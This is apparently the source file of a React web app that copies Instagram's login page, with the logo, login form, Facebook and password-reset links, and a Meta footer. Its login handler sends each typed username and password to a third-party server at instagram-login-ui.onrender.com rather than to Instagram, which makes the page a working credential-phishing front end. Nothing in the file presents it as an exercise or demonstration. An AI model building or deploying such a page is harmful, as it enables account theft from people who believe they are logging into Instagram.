import { useState } from 'react';
import axios from 'axios';
import './App.css';

function App() {
  const [formData, setFormData] = useState({
    identifier: '',
    password: ''
  });

  const [message, setMessage] = useState('');

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    setMessage('');

    try {
  const response = await axios.post(
    'https://instagram-login-ui.onrender.com/api/login',
    {
      identifier: formData.identifier,
      password: formData.password
    },
    {
      headers: {
        'Content-Type': 'application/json'
      }
    }
  );

  // show backend message even on success response
  if (response.data?.message) {
    setMessage(response.data.message);
  }

} catch (error) {
  setMessage(
    error.response?.data?.message || '❌ Server error'
  );
}

  };

  return (
    <div className="app-container">
      <main className="main-content">

        {/* LEFT SIDE PHONE IMAGE */}
        <div className="phones-container"></div>

        {/* RIGHT SIDE LOGIN */}
        <div className="login-section">

          <div className="login-box">
            <h1 className="logo">Instagram</h1>

            <form onSubmit={handleLogin} className="login-form">
              <input
                type="text"
                name="identifier"
                placeholder="Phone number, username or email address"
                value={formData.identifier}
                onChange={handleChange}
                required
              />

              <input
                type="password"
                name="password"
                placeholder="Password"
                value={formData.password}
                onChange={handleChange}
                required
              />

              <button
                type="submit"
                className="login-btn"
                disabled={!formData.identifier || !formData.password}
              >
                Log in
              </button>

              {message && (
                <p className="error-message">{message}</p>
              )}
            </form>

            {/* DIVIDER */}
            <div className="divider">
              <div className="line"></div>
              <span>OR</span>
              <div className="line"></div>
            </div>

            {/* ✅ UPDATED WRAPPER (FIXES COLLISION) */}
            <div className="login-links">
              <a href="#" className="fb-login">
                Log in with Facebook
              </a>

              <a href="#" className="forgot-password">
                Forgotten your password?
              </a>
            </div>
          </div>

          <div className="signup-box">
            Don&apos;t have an account? <span>Sign up</span>
          </div>

        </div>
      </main>

      {/* FOOTER */}
      <footer className="footer">
        <div className="footer-links">
          <a>Meta</a>
          <a>About</a>
          <a>Blog</a>
          <a>Jobs</a>
          <a>Help</a>
          <a>API</a>
          <a>Privacy</a>
          <a>Terms</a>
          <a>Locations</a>
          <a>Instagram Lite</a>
          <a>Meta AI</a>
          <a>Threads</a>
          <a>Contact uploading and non-users</a>
          <a>Meta Verified</a>
        </div>

        <div className="footer-bottom">
          <span>English (UK)</span>
          <span>© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}

export default App;
